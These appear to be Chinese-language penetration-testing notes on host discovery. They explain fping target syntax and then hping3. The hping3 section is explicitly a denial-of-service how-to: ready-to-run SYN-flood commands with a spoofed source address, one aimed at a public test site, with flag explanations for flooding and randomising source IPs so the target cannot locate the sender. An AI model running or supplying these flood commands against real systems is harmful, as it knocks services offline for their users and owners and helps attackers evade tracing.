[TOC]

# 01 -  信息收集
## 1.1存活主机识别
### 1.1.1 arping
pass
### 1.1.2 fping

Fping类似于ping，但比ping强大。Fping与ping不同的地方在于，fping可以在命令行中指定要ping的主机数量范围，也可以指定含有要ping的主机列表文件。

目标IP地址的输入方式：
```
fping IP1 IP2 IP3 ...；

fping -f filename；

fping -g IP1 IP2（IP1地址开始范围，IP2地址结束范围）；
```
### 1.1.3 hping3


使用hping3进行DoS攻击：

使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。

```
hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
```
now I use testphp.vulnweb.com to test :

```
hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source testphp.vulnweb.com
```
Do not uses string like:  http:// or www.

    -c：发送数据包的个数
    -d：每个数据包的大小
    -S：发送SYN数据包
    -w：TCP window大小
    -p：目标端口，你可以指定任意端口
    –flood：尽可能快的发送数据包
    –rand-source：使用随机的IP地址，目标机器看到一堆ip，不能定位你的实际IP；也可以使用-a或–spoof隐藏主机名

